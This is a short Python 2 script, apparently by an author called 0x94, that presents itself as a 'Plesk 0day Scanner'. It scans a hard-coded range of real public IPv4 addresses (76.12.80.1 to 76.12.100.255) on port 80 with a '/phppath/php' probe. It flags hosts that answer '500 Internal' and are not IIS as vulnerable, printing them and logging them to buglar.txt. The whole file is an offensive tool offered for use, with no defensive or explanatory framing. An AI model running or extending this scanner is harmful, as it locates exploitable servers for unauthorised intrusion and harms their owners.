

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Plesk 0day Scanner by 0x94

import socket
import Queue
import threading
from time import sleep

queue = Queue.Queue()

def ipRange(start_ip, end_ip):
   start = list(map(int, start_ip.split(".")))
   end = list(map(int, end_ip.split(".")))
   temp = start
   ip_range = []
   
   ip_range.append(start_ip)
   while temp != end:
      start[3] += 1
      for i in (3, 2, 1):
         if temp[i] == 256:
            temp[i] = 0
            temp[i-1] += 1
      ip_range.append(".".join(map(str, temp)))    
     
   return ip_range
   


class tarama(threading.Thread):
   def __init__(self,queue,lock):
        threading.Thread.__init__(self)
        self.queue = queue
        self.lock       = lock
   def run(self):
      while not self.queue.empty(): 
         try:
            gelip = self.queue.get()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((gelip, 80))
            s.send("GET /phppath/php HTTP/1.0\r\n\r\n")  
            buf = s.recv(1024);
            if "500 Internal" in buf and "IIS" not in buf:
               with self.lock:
                  print gelip +" acik var"
                  dosya=open("buglar.txt","a+")
                  dosya.write(gelip+" Plesk\n")
                  dosya.close()                  
         except socket.error, msg:
            with self.lock:
               print gelip+ ' hata olustu / ' + str(msg)
   #else:
      #print gelip + "yok"
   
   
ip_range = ipRange("76.12.80.1", "76.12.100.255")
for ip in ip_range:
   queue.put(ip)

threads = []
lock    = threading.Lock()
for i in range(2):
   t = tarama(queue,lock)
   t.setDaemon(True)
   threads.append(t)
   t.start()
   
while any([x.isAlive() for x in threads]):
   sleep(0.3)

